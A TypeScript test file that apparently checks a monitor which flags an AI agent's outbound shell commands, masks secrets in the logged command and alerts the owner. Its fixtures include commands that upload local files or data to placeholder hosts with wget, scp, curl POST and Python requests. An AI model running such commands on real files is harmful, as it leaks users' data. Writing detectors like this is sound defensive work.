import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import type { DatabaseInstance, Knowledge } from '@jungjaehoon/mama-core';

import {
  createOutboundEventRecorder,
  type OutboundAttemptEvent,
} from '../../src/api/security-events.js';
import { createActionSurface } from '../../src/runtime/action-surface.js';
import { outboundAttempt, withOutboundAttempts } from '../../src/runtime/outbound-attempts.js';
import { createTimeZoneSetting } from '../../src/runtime/timezone.js';

const bash = (command: string | string[], id = 'call-1') => ({ command, nativeToolUseId: id });

describe('outbound attempts', () => {
  it.each([
    ["curl -sS -X POST -d 'null' https://upload.example/post", true],
    ['curl -sS -o /dev/null https://example.com/', false],
    ['wget --post-file=report.xlsx https://upload.example/', true],
    ['pip install formulas', false],
    ['cd /tmp && git push origin main', true],
    ['scp report.xlsx host.example:/tmp/', true],
    [
      `python3 -c "import requests; requests.post('https://x.example', data=open('a').read())"`,
      true,
    ],
    [['bash', '-lc', 'curl https://example.com'], false],
  ])('reports a shell command that opens a connection: %s', (command, sendsData) => {
    expect(outboundAttempt('Bash', bash(command), 'mr_run')).toMatchObject({
      class: 'outbound_attempt',
      tool: 'Bash',
      sendsData,
      modelRunId: 'mr_run',
      callId: 'call-1',
    });
  });

  it.each([
    'ls -la',
    `python3 - <<'EOF'\nimport openpyxl\nprint('https://trello.com/c/abc')\nEOF`,
    'grep -r "https://drive.google.com" notes.md',
    'ssh-keygen -l -f key.pub',
  ])('leaves a local command alone: %s', (command) => {
    expect(outboundAttempt('Bash', bash(command), 'mr_run')).toBeNull();
  });

  it('reads Codex shell items and leaves web fetch and web search to tool_traces', () => {
    expect(
      outboundAttempt('commandExecution', bash('curl -d x https://a.example'), 'mr')
    ).toMatchObject({ tool: 'commandExecution', sendsData: true });
    expect(outboundAttempt('WebFetch', { url: 'https://example.com/?q=data' }, 'mr')).toBeNull();
    expect(outboundAttempt('WebSearch', { query: 'exchange rate' }, 'mr')).toBeNull();
  });

  it('masks a secret in the traced command', () => {
    // Built at run time so no key-shaped literal sits in the source.
    const body = 'q'.repeat(36);
    const key = ['sk', 'ant', 'api03', body].join('-');
    const event = outboundAttempt(
      'Bash',
      bash(`curl -H "Authorization: Bearer ${key}" https://a.example`),
      'mr'
    );
    expect(event?.summary).not.toContain(body);
  });

  it('reports a call the runtime announces twice once, and still traces it', () => {
    const inner = { started: vi.fn(), settled: vi.fn(), interrupted: vi.fn(), finished: vi.fn() };
    const sink = vi.fn();
    const observer = withOutboundAttempts(inner, 'mr_run', sink);
    observer.started('Bash', bash('curl https://a.example', 'same'));
    observer.started('Bash', bash('curl https://a.example', 'same'));
    observer.started('Bash', bash('ls', 'other'));
    expect(inner.started).toHaveBeenCalledTimes(3);
    expect(sink).toHaveBeenCalledTimes(1);
  });

  it('reaches the sink through the action surface the owner runtime builds', () => {
    const sink = vi.fn();
    const surface = createActionSurface({
      timeZone: createTimeZoneSetting('UTC'),
      configPath: '/tmp/mama-test-config.yaml',
      isOwnerMessageTurn: () => true,
      adapter: {
        prepare: () => ({ run: () => ({ changes: 1 }), get: () => undefined, all: () => [] }),
      } as unknown as DatabaseInstance,
      knowledge: {} as Knowledge,
      ownerPrincipalId: 'owner-test',
      agentId: 'agent-test',
      outboundAttempts: sink,
    });
    surface
      .createNativeEffectObserver('mr_surface')
      .started('Bash', bash('curl -X POST https://a.example'));
    expect(sink).toHaveBeenCalledWith(
      expect.objectContaining({ modelRunId: 'mr_surface', sendsData: true })
    );
  });
});

describe('outbound event recorder', () => {
  let dir: string;
  const event = (summary: string): OutboundAttemptEvent => ({
    time: new Date().toISOString(),
    class: 'outbound_attempt',
    tool: 'Bash',
    summary,
    sendsData: true,
    modelRunId: 'mr_run',
    callId: 'call-1',
  });
  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'outbound-events-'));
  });
  afterEach(() => {
    vi.useRealTimers();
    rmSync(dir, { recursive: true, force: true });
  });

  it('writes every attempt and alerts the owner, grouping a burst within a minute', async () => {
    vi.useFakeTimers();
    vi.setSystemTime(0);
    const sent: Array<{ text: string; key: string }> = [];
    const recorder = createOutboundEventRecorder({
      path: join(dir, 'security-events.jsonl'),
      timeZone: createTimeZoneSetting('UTC'),
      sendToOwner: async (text, key) => {
        sent.push({ text, key });
      },
    });
    recorder.record(event('curl -X POST one'));
    recorder.record(event('curl -X POST two'));
    vi.setSystemTime(61_000);
    recorder.record(event('curl -X POST three'));
    await vi.runAllTimersAsync();

    const lines = readFileSync(join(dir, 'security-events.jsonl'), 'utf8').trim().split('\n');
    expect(lines.map((line) => JSON.parse(line).summary)).toEqual([
      'curl -X POST one',
      'curl -X POST two',
      'curl -X POST three',
    ]);
    expect(sent).toHaveLength(2);
    expect(sent[0].text).toContain('Agent outbound attempt');
    expect(sent[0].text).toContain('Sends data: yes');
    expect(sent[0].key).toMatch(/^agent-outbound:/);
    expect(sent[1].text).toContain('Suppressed since previous alert: 1');
  });

  it('records without alerting during replay', async () => {
    const send = vi.fn(async () => undefined);
    const recorder = createOutboundEventRecorder({
      path: join(dir, 'security-events.jsonl'),
      replay: true,
      timeZone: createTimeZoneSetting('UTC'),
      sendToOwner: send,
    });
    recorder.record(event('curl -X POST replayed'));
    await Promise.resolve();
    expect(send).not.toHaveBeenCalled();
    expect(readFileSync(join(dir, 'security-events.jsonl'), 'utf8')).toContain('replayed');
  });
});
